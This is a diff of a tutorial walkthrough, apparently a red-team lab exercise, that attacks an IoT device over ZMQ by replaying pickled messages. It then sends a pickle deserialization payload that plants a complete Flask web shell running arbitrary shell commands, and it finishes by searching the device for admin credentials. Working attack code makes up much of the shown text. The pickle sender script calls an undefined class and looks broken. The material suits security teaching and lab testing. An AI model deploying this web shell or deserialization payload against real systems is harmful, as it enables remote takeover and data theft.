@@ -93,6 +93,16 @@ def randint(a, b):
 
 Python Package Hijacking is a critical security vulnerability that can lead to significant consequences if exploited. By understanding the mechanics of this attack and implementing robust security measures, developers can protect their applications and systems from such threats. Proper dependency management, secure coding practices, and regular code audits are essential steps in mitigating the risks associated with Python Package Hijacking.
 
+#### Python Web Shell Attack 
+
+A web shell attack script is a malicious script that is uploaded to a web server to provide an attacker with remote access and control over the server. Web shells are typically used by attackers to execute arbitrary commands, steal data, modify files, and perform other malicious activities on the compromised server. These scripts can be written in various programming languages commonly used in web development, such as PHP, ASP, JSP, and Python. The attack flow will follow below sequence:
+
+1. **Initial Compromise**: The attacker exploits a vulnerability in the web application or server, such as an insecure file upload function, a code injection vulnerability, or a weak password, to upload the web shell script.
+2. **Upload and Execution**: Once the web shell is uploaded, the attacker accesses it via a web browser or a specialized client. The web shell script is executed on the server, giving the attacker an interface to interact with the server.
+3. **Remote Control**: The attacker uses the web shell to execute commands on the server, upload or download files, steal sensitive information, escalate privileges, and potentially use the compromised server to launch further attacks.
+
+Web shell attack scripts are powerful tools used by attackers to gain remote control over web servers. Understanding how these scripts work and implementing robust security measures can help protect web applications and servers from such attacks. By securing file uploads, validating inputs, and maintaining vigilant monitoring, organizations can mitigate the risks associated with web shell attacks.
+
 
 
 ------
@@ -117,17 +127,7 @@ IoT IP: 172.23.155.209
 
 #### Understand the Traffic and Find Vulnerabilities
 
-The red team attack capture a bout 10 mins of the IoT traffic which includes the network engineer communicate with the IoT, he analyzed the pcap file and find there are 2 kind of protocol connect to the IoT: 
-
-**IoT supported protocol 1: HTTP connection  **  
-
-The attacker find the normal http connection use port 5000, then he tried to access the IoT web interface with URL: http://172.23.155.209:5000/, the he get to the IoT home page: 
-
-![](img/s_07.png)
-
-But he was blocked by the user login authorization page as he don't have a valid account to access more information:
-
-![](img/s_08.png)
+The red team attack capture a bout 10 mins of the IoT traffic which includes the network engineer communicate with the IoT, he analyzed the pcap file and find there is one kind of protocol connect to the IoT: 
 
 
 
@@ -141,7 +141,226 @@ Now he analysis the the bytes go to the ZMQ server, he finds the message is not 
 
 ![](img/s_06.png)
 
-Then he write his simple ZMQ client program to implement a simple replay attack to the IoT and 
+Then he write his simple ZMQ client program to implement a simple reply attack to the IoT and get the same bytes data:
+
+![](img/s_11.png)
+
+Now the hacker mapping the data and the bytes 
+
+![](img/s_12.png)
+
+He can confirm that he can connect to the IoT use ZMQ client to fetch some data, and the send message is pickled to bytes. Now he make his ZMQ client program which can send some data he can edit to the IoT:
+
+```python
+import zmq
+import pickle
+iotIP = '172.23.155.209'
+port = 3003
+
+context = zmq.Context()
+print("Connecting to server...")
+socket = context.socket(zmq.REQ)
+#socket.connect ("tcp://localhost:%s" % port)
+socket.connect("tcp://%s:%s" %(iotIP,port))
+print("Sending request btyes via ZMQ client:")
+#socket.send(b'123')
+configData = {
+    'TEST_MD': None , 
+    'RADAR_TYPE':None,
+    'RADAR_PORT': None,
+    'RADAR_UPDATE_INTERVAL': None,
+    'RPT_MD': None,
+    'RPT_INT': None,
+    'RPT_SER_IP': None,
+    'RPT_SER_PORT': None,
+    'WEB_PORT': None
+}
+
+pickledata = pickle.dumps(configData, protocol=pickle.HIGHEST_PROTOCOL)
+print(str(pickledata))
+socket.send(pickledata)
+#  Get the reply.
+replyData = socket.recv()
+print("received reply bytes:")
+print(str(replyData))
+reqDict = pickle.loads(replyData)
+print ("Received reply: \n %s" %str(reqDict))
+```
+
+The execution shows he can get the IoT config file information as shown below, and use the pickle loads function he can get the Web_port information which is 5000.
+
+![](img/s_13.png)
+
+> Remark: the attacker can also use the Nmap to probing all the service of the IoT but that may be detected by the network thread detection program.
+
+You can download the package file pcap example from link: https://github.com/LiuYuancheng/Xandar_PPL_Sensor_IOT_Web/blob/master/resource/ZMQ_package_example.pcapng
 
 
 
+**IoT supported protocol 1: HTTP connection  **  
+
+In the previous step The attacker find the normal http connection use port 5000, then he tried to access the IoT web interface with URL: http://172.23.155.209:5000/, the he get to the IoT home page: 
+
+![](img/s_07.png)
+
+But he was blocked by the user login authorization page as he don't have a valid account to access more information:
+
+![](img/s_08.png)
+
+But he tried dictionary attack he find there is user named "admin" but he don't know the password
+
+
+
+After do the network analysis, the hacker find 2 possible vulnerability: 
+
+1. The IoT ZMQ challenge use pickle to sterilize the data the he may be create a pickle bomb to do the python Deserialization Attack. 
+2. There is a user named "Admin" which can login the IoT's management page, but he need to find how to by pass the authorization. 
+
+
+
+#### Build A Pickle Bomb to Implement Deserialization Attacks
+
+Based on the 1st vulnerability, now the hacker want to build a Pickle Bomb to attack the ZMQ server. You can follow this project to build a UDP comment executer : https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/pickleBomb, in this section web will provide another easier solution which create a web shell which can run command on the IoT device. We use flask to build the web shell program, for the data feed back, we use soketIO so the command execution result will dynamically update on the page. As the port 5000 is used by the IoT management web host our web shell use 5001 and as we need to serialize the program as one pickle bomb, the HTML page need to be assembled as pure text string in the web shell program: 
+
+```python
+# The all in one version of the flask web shell which remove all the comments 
+import subprocess
+from flask import Flask, request
+from flask_socketio import SocketIO, emit # pip install Flask-SocketIO==5.3.5
+gflaskPort = 5000
+
+HTML_CONTENT = """<!doctype html>
+<html>
+    <head>
+        <!-- Required meta tags -->
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/3.0.4/socket.io.js"></script>
+        <title> Flask Web Shell </title>
+    </head>
+    <body>
+        <h1> Flask Simple Web Shell </h1>
+        <hr>
+        <p> Input the command you want to execute on victim: </p>
+        <form>
+            <textarea class="form-control" style="font-family: monospace;" rows="1" id="cmdContents" name="cmdContents"></textarea>
+            <button type="submit"> Rum cmd </button>
+        </form>
+        <hr>
+        <p> Command execution result: </p>
+        <form>
+            <div id="cmdresult" style="display: block">
+                <textarea class="form-control" style="font-family: monospace;" rows="10" id="resultContents" name="resultContents", value=""></textarea>
+            </div>
+        </form>
+        <script>
+            $(document).ready(function() {
+                $('form').submit(function(event) {
+                    event.preventDefault();
+                    $.ajax({
+                        type: 'POST',
+                        url: '/cmdsubmit',
+                        data: $('form').serialize(),
+                    });
+                });
+                var socket = io();
+                socket.on('connect', function () {
+                    socket.emit('cli_request', { data:  'connected!' });
+                });
+                socket.on('exeResult', function (msg) {
+                    console.log(msg.data);
+                    document.getElementById('resultContents').innerHTML = msg.data
+                });
+            });
+         </script>
+    </body>
+</html>
+"""
+
+app = Flask(__name__)
+socketio = SocketIO(app)
+
+@app.route('/')
+def index():
+    """ route to introduction index page."""
+    return HTML_CONTENT
+
+@app.route('/cmdsubmit', methods=['POST','GET'])
+def cmdsubmit():
+    """ Run the command the feed back the data to web."""
+    cmd = request.form['cmdContents']
+    cmd = cmd.strip()
+    result = None 
+    try:
+        result = subprocess.check_output(cmd, shell=True).decode()
+    except Exception as err:
+        result = str(err)
+    socketio.emit('exeResult', {'data': str(result)})
+    return 'Command execution finished'
+
+@socketio.event
+def connect():
+    emit('serv_response', {'data': 'web shell ready'})
+
+if __name__ == '__main__':
+    app.run(host="0.0.0.0", port=gflaskPort, debug=False, threaded=True)
+```
+
+To download the full code of the web shell, please refer to this repo: https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/flaskWebShell
+
+After finished the web shell attack scrip, we need to build a Pickle bomb and send to the IoT's ZMQ server. You can use this Pickle Bomb builder program, here we combine the builder and sender together:
+
+```python
+iotIP = '172.23.155.209'
+port = 3003
+
+context = zmq.Context()
+print("Connecting to server...")
+socket = context.socket(zmq.REQ)
+#socket.connect ("tcp://localhost:%s" % port)
+socket.connect("tcp://%s:%s" %(iotIP,port))
+print("Sending request btyes via ZMQ client:")
+
+fileNameStr = 'flaskWebShellApp.py'
+obj = None
+try:
+    with open(fileNameStr, 'r') as fh:
+        dataStr = fh.read()
+    obj = PickleCodeBomb()
+except Exception as err:
+    print("Error: can not read python file %s" % err)
+    exit()
+pickledata = pickle.dumps(obj, protocol=pickle.HIGHEST_PROTOCOL)
+socket.send(pickledata)
+#  Get the reply.
+replyData = socket.recv()
+print("received reply bytes:")
+print(str(replyData))
+reqDict = pickle.loads(replyData)
+print ("Received reply: \n %s" %str(reqDict))
+```
+
+After run the sender to send the web shell pickle bomb as data string to the IoT , we open URL: http://172.23.155.209:5001/ and the attack web shell show up, the we have successful activated the bomb and compromized the IoT device. 
+
+Now let's try some command to cd to the IoT firmware page to list the file : 
+
+![](img/s_14.png)
+
+Now our deserialization attack got success. 
+
+
+
+#### Bypass IoT Authorization and Implement Local File Hijacking Attack
+
+Based on the 2nd vulnerability, the attacker try to search some data related to the string "admin" with the cmd 
+
+```
+grep "admin" Xandar_Sensor_Web/src/*
+```
+
+Then we can find there is one json file contents the "admin" but without the password:
+
+![](img/s_15.png)
